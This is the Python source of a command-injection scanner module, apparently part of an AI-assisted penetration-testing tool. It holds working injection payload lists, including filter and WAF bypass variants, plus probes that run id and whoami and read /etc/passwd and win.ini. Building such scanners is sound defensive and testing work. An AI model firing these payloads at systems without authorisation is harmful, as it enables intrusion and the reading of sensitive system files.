"""
XLayer AI RCE Hunter - Remote Code Execution / Command Injection
Detects OS command injection via time-based blind detection and OOB callbacks.
Covers: Unix/Linux commands, Windows commands, various injection syntaxes.
"""

import re
import time
from typing import List, Optional, Dict, Any
from loguru import logger

from xlayer_ai.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_ai.models.target import AttackSurface, Endpoint
from xlayer_ai.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)


# ─── Blind Time-Based Payloads (most reliable detection method) ───────────────
# Format: (payload, delay_seconds, description)
TIME_PAYLOADS = [
    # Unix — semicolon separation
    ("; sleep 5",           5, "unix_semicolon"),
    ("| sleep 5",           5, "unix_pipe"),
    ("& sleep 5",           5, "unix_ampersand"),
    ("&& sleep 5",          5, "unix_and"),
    ("|| sleep 5",          5, "unix_or"),
    # Unix — subshell
    ("`sleep 5`",           5, "unix_backtick"),
    ("$(sleep 5)",          5, "unix_subshell"),
    # Unix — newline
    ("%0asleep 5",          5, "unix_newline_url"),
    ("\nsleep 5",           5, "unix_newline"),
    # Windows
    ("& timeout /t 5 /nobreak", 5, "windows_timeout"),
    ("| timeout /t 5 /nobreak", 5, "windows_pipe_timeout"),
    ("& ping -n 5 127.0.0.1",   4, "windows_ping"),
    # Filter bypass — IFS substitution
    ("${IFS}sleep${IFS}5", 5, "ifs_bypass"),
    # Filter bypass — quotes
    (";sl'e'ep 5",          5, "quote_bypass"),
    (";sl\"e\"ep 5",        5, "dquote_bypass"),
    # Encoded
    (";%73leep%205",        5, "url_encoded"),
]

# ─── Error-Based Detection Patterns ──────────────────────────────────────────
RCE_ERROR_PATTERNS = [
    r"sh: .+: not found",
    r"bash: .+: command not found",
    r"cmd\.exe",
    r"'[^']+' is not recognized as an internal or external command",
    r"cannot execute binary file",
    r"/bin/sh: ",
    r"Permission denied",
    r"uid=\d+\(\w+\) gid=\d+",        # id command output
    r"root:x:0:0",                      # /etc/passwd
    r"Volume Serial Number",            # Windows dir output
    r"Directory of C:\\",
]

# ─── Output-Based Payloads (when app reflects output) ────────────────────────
OUTPUT_PAYLOADS = [
    "; id",
    "| id",
    "` id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "& whoami",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",
    # Filter bypass variants
    "; /usr/bin/id",
    "; /bin/cat /etc/passwd",
    "; c'a't /etc/passwd",
    "; {cat,/etc/passwd}",
]

# ─── Parameters likely vulnerable to RCE ─────────────────────────────────────
RCE_SUSPICIOUS_PARAMS = [
    "cmd", "exec", "command", "run", "system", "shell",
    "ping", "host", "ip", "addr", "address", "target",
    "url", "file", "path", "name", "dir", "folder",
    "query", "input", "data", "arg", "args", "param",
    "convert", "resize", "format", "type", "output",
]


class RCEHunter(BaseHunter):
    """
    Remote Code Execution / Command Injection Hunter.

    Detection strategy (in order of reliability):
    1. Time-based blind: inject sleep/timeout, measure delay
    2. Error-based: inject invalid command, check error messages
    3. Output-based: inject id/whoami, check reflection
    """

    name = "rce"
    vuln_types = [VulnType.COMMAND_INJECTION]

    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        start_time = time.time()
        self._reset_state()

        logger.info(f"RCE Hunter starting on {len(attack_surface.testable_endpoints)} endpoints")

        for endpoint in attack_surface.testable_endpoints:
            for param in endpoint.parameters:
                # Prioritize suspicious param names
                priority = param.name.lower() in RCE_SUSPICIOUS_PARAMS
                await self._test_rce(endpoint, param.name, priority, attack_surface)

        duration = time.time() - start_time
        result = self._build_result(duration)
        logger.info(f"RCE Hunter complete: {result.findings_count} hypotheses")
        return result

    async def _test_rce(
        self, endpoint: Endpoint, parameter: str, priority: bool,
        attack_surface: AttackSurface
    ):
        self._endpoints_tested += 1

        # Step 1: Baseline timing
        baseline_start = time.monotonic()
        baseline = await self._send_payload(endpoint, parameter, "test_rce_baseline")
        baseline_ms = (time.monotonic() - baseline_start) * 1000
        if not baseline:
            return

        # Step 2: Time-based detection (most reliable — no WAF bypass needed)
        h = await self._test_time_based(endpoint, parameter, baseline_ms)
        if h:
            self._hypotheses.append(h)
            return

        # Step 3: Adaptive output-based attack (WAF bypass via MutationEngine + AI)
        ctx = self._build_attack_context(endpoint, parameter, "rce", attack_surface)
        ctx.baseline_length = len((baseline or {}).get("body", ""))
        ctx.baseline_time_ms = baseline_ms

        def rce_success(send_result, attack_ctx):
            body = send_result.body
            for pattern in RCE_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    return True
            # Time-based via adaptive: payload caused measurable delay
            if send_result.elapsed_ms >= (attack_ctx.baseline_time_ms + 3000):
                return True
            return False

        attempts = await self._adaptive_test(
            endpoint, parameter, list(OUTPUT_PAYLOADS), ctx, rce_success,
        )

        for attempt in attempts:
            if attempt.success:
                is_time = attempt.elapsed_ms >= (baseline_ms + 3000)
                h = self._create_hypothesis(
                    vuln_type=VulnType.COMMAND_INJECTION,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=Confidence.HIGH,
                    indicators=[
                        VulnIndicator(
                            indicator_type="time_delay" if is_time else "command_output",
                            detail=(
                                f"RCE confirmed via adaptive bypass: '{attempt.payload[:60]}' "
                                f"({'time-based' if is_time else 'output-based'})"
                            ),
                            confidence_boost=0.35,
                        )
                    ],
                    suggested_payloads=[attempt.payload, "; id", "| whoami", "$(id)"],
                    context={
                        "injection_type": "adaptive_bypass",
                        "trigger_payload": attempt.payload,
                        "waf_bypassed": ctx.waf,
                        "os_type": "windows" if "timeout" in attempt.payload else "unix",
                    },
                )
                self._hypotheses.append(h)
                return

        # Step 4: Error-based (final fallback)
        h = await self._test_error_based(endpoint, parameter)
        if h:
            self._hypotheses.append(h)

    async def _test_time_based(
        self, endpoint: Endpoint, parameter: str, baseline_ms: float
    ) -> Optional[VulnHypothesis]:
        for payload, expected_delay, inject_type in TIME_PAYLOADS:
            self._payloads_sent += 1
            start = time.monotonic()
            response = await self._send_payload(endpoint, parameter, payload)
            elapsed_ms = (time.monotonic() - start) * 1000

            if not response:
                continue

            expected_ms = expected_delay * 1000
            # Confirm: response took ~expected_delay longer than baseline
            if elapsed_ms >= (expected_ms * 0.85) and elapsed_ms > (baseline_ms + 3000):
                # Double-confirm with a shorter delay to rule out server slowness
                self._payloads_sent += 1
                verify_payload = payload.replace(str(expected_delay), "2")
                v_start = time.monotonic()
                v_resp = await self._send_payload(endpoint, parameter, verify_payload)
                v_elapsed = (time.monotonic() - v_start) * 1000

                if v_elapsed >= 1800 and v_elapsed < elapsed_ms:
                    return self._create_hypothesis(
                        vuln_type=VulnType.COMMAND_INJECTION,
                        endpoint=endpoint,
                        parameter=parameter,
                        confidence=Confidence.HIGH,
                        indicators=[
                            VulnIndicator(
                                indicator_type="time_delay",
                                detail=(
                                    f"Command injection confirmed via timing: "
                                    f"payload='{payload}' delay={elapsed_ms:.0f}ms "
                                    f"(baseline={baseline_ms:.0f}ms)"
                                ),
                                confidence_boost=0.35,
                            )
                        ],
                        suggested_payloads=[
                            payload,
                            "; id",
                            "| whoami",
                            "$(id)",
                            "; cat /etc/passwd",
                        ],
                        context={
                            "injection_type": inject_type,
                            "trigger_payload": payload,
                            "delay_ms": round(elapsed_ms),
                            "baseline_ms": round(baseline_ms),
                            "os_type": "windows" if "timeout" in inject_type else "unix",
                        },
                    )
        return None

    async def _test_output_based(
        self, endpoint: Endpoint, parameter: str
    ) -> Optional[VulnHypothesis]:
        for payload in OUTPUT_PAYLOADS:
            self._payloads_sent += 1
            response = await self._send_payload(endpoint, parameter, payload)
            if not response or response.get("error"):
                continue

            body = response["body"]
            for pattern in RCE_ERROR_PATTERNS:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    return self._create_hypothesis(
                        vuln_type=VulnType.COMMAND_INJECTION,
                        endpoint=endpoint,
                        parameter=parameter,
                        confidence=Confidence.HIGH,
                        indicators=[
                            VulnIndicator(
                                indicator_type="command_output",
                                detail=f"Command output detected: '{match.group(0)[:80]}'",
                                confidence_boost=0.4,
                            )
                        ],
                        suggested_payloads=[payload, "; id", "| whoami"],
                        context={
                            "injection_type": "output_based",
                            "trigger_payload": payload,
                            "evidence": match.group(0)[:100],
                        },
                    )
        return None

    async def _test_error_based(
        self, endpoint: Endpoint, parameter: str
    ) -> Optional[VulnHypothesis]:
        error_probes = [
            "; echo xlayer_rce_test",
            "| echo xlayer_rce_test",
            "`echo xlayer_rce_test`",
            "$(echo xlayer_rce_test)",
        ]
        for payload in error_probes:
            self._payloads_sent += 1
            response = await self._send_payload(endpoint, parameter, payload)
            if not response:
                continue
            body = response["body"]
            if "xlayer_rce_test" in body:
                return self._create_hypothesis(
                    vuln_type=VulnType.COMMAND_INJECTION,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=Confidence.HIGH,
                    indicators=[
                        VulnIndicator(
                            indicator_type="echo_reflection",
                            detail="Command output reflected: echo marker found in response",
                            confidence_boost=0.4,
                        )
                    ],
                    suggested_payloads=[payload, "; id", "; cat /etc/passwd"],
                    context={
                        "injection_type": "output_reflection",
                        "trigger_payload": payload,
                    },
                )
        return None

    def _analyze_response(self, endpoint, parameter, payload, response):
        return None
